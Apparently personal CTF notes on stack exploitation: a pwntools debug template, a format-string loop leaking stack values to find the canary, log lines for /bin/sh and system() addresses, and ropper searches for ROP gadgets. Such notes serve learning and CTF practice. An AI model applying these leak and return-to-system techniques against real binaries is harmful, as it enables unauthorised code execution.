---
title: "Ippsec notes (pwn)"
category: "pwn"
subcategory: "stack"
type: "technique"
tags: ["my-notes", "personal", "canary", "ippsec", "notes", "pwn"]
summary: "-> https://www.youtube.com/watch?v=HM8Pf8zxko&t=4611s"
source:
  name: "Personal notes"
origin_path: "pwn/Ippsec notes.md"
---

# Debug Template
```python
from pwn import *
e = ELF("binary_name")
context.terminal = ['tmux','splitw','-h','-F','#{pane_pid','-P']
io = gdb.debug("binary_name")
```
# Fuzz canary
```python
from pwn import *
e = ELF('binary_name')
for i in range(100):
	io = e.process(level='error')
	io.recvline()
	io.recvline()
	io.sendline(f"%{i}$lx")
	line = io.recvline()[19:-2]
	print(f"{i}\t{line.decode()}")
	io.close()
```
# Random lines but helpful
```python
log.info(f"Canary: {hex(canary)}")
```

```python
binsh = p64(binsh_address)
log.info(f"[+] /bin/sh: {binsh.hex()}")
```

```python
system = p64(e.sym.system)
log.info(f"[+] System: {system.hex()}")
```
# Ropper
```bash
ropper -f binary_name --string "/bin/sh"
```

```bash
ropper -f binary_name --search "pop rdi; ret"
```
# Reference
-> https://www.youtube.com/watch?v=HM8_Pf8zxko&t=4611s

---

*From your own notes: `pwn/Ippsec notes.md`*
